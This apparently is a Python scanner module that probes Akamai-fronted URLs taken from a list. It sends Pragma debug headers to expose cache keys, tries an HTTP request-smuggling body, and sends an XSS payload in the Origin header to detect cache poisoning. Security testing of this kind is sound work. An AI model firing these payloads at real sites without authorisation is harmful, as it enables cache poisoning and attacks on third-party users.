#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from modules.utils import *


def akamai(url, s):
    """
       https://techdocs.akamai.com/edge-diagnostics/docs/pragma-headers
       akamai-x-get-nonces
       pragma_debug = [ "akamai-x-ew-debug-rp", "akamai-x-ew-onoriginrequest", "akamai-x-ew-onoriginresponse", "akamai-x-ew-onclientresponse"]
    """
    pragma_list = {
    "akamai-x-cache-on": "X-Cache",
    "akamai-x-get-cache-key, akamai-x-get-true-cache-key": "X-Cache",
    "akamai-x-cache-remote-on": "X-Cache-Remote",
    "akamai-x-check-cacheable": "X-Check-Cacheable",
    "akamai-x-get-true-cache-key": "X-True-Cache-Key", 
    "akamai-x-get-cache-key": "X-Cache-Key", 
    "akamai-x-serial-no": "X-Serial", 
    "akamai-x-get-request-id": "X-Akamai-Request-ID",
    "akamai-x-get-extracted-values": "X-Akamai-Session-Info",
    "akamai-x-get-ssl-client-session-id": "x-akamai-ssl-client-sid",
    "akamai-x-ew-debug": "X-Akamai-EdgeWorker",
    "akamai-x-ew-onclientrequest": "X-Akamai-EdgeWorker",
    "akamai-x-ew-debug-subs": "X-Akamai-EdgeWorker"
    }


    for pgl in pragma_list:
        header = {"Pragma": pgl}
        res = pragma_list[pgl]
        try:
            req = s.get(url, verify=False, headers=header, timeout=10)
            #print(req.headers)
            if pragma_list[pgl] in req.headers:
                print(f"\033[36m   - {url} | H:{header}\033[0m")
                print(f"   └── {res}: {req.headers[res]}")
        except:
            pass
    req_smuggling(url, s)
    xss_akamai(url, s)
    

def req_smuggling(url, s):
    #https://medium.com/@jacopotediosi/worldwide-server-side-cache-poisoning-on-all-akamai-edge-nodes-50k-bounty-earned-f97d80f3922b
    #https://blog.hacktivesecurity.com/index.php/2022/09/17/http/
    url = f"{url}?cb={random.randrange(999)}"

    headers = {
        "Connection": "Content-Length",
        }

    body = (
        "   \r\n\r\n"
        "   GET / HTTP/1.1\r\n"
        "   Host: www.example.com\r\n"
        "   X-Foo: x\r\n"
    )

    #print(body)
    res_main = s.get(url, verify=False, timeout=10)
    response = s.get(url, headers=headers, data=body, verify=False, timeout=10)

    if response.status_code > 500 and response.status_code != res_main.status_code:
        print(f'  \033[33m └── [INTERESTING BEHAVIOR]\033[0m | {url} [{res_main.status_code} > {response.status_code}]\n     └── H {headers}\n     └── B {body}')


def xss_akamai(url, s):
    url = f"{url}?cb={random.randrange(999)}"

    headers = {
    "Origin": "'-alert(1)-'"
    }
    
    try:
        response = s.get(url, headers=headers, verify=False, timeout=10)
        for h in response.headers:
            if "x-true-cache-key" in h.lower() and "origin" in response.headers[h.lower()]:
                print(f'  \033[33m └── [INTERESTING BEHAVIOR]\033[0m | {url} \n   └── H {headers}\n  ')
    except Exception as e:
        print(f"Error : {e}")
        pass


if __name__ == '__main__':
    url_file = sys.argv[1]
    s = requests.Session()
    #akamai(url_file, s)
    with open(url_file, "r") as urls:
        urls = urls.read().splitlines()
        for url in urls:
            try:
                akamai(url, s)
            except KeyboardInterrupt:
                print("Exiting")
                sys.exit()
            except:
                pass
            print(f" {url}", end='\r')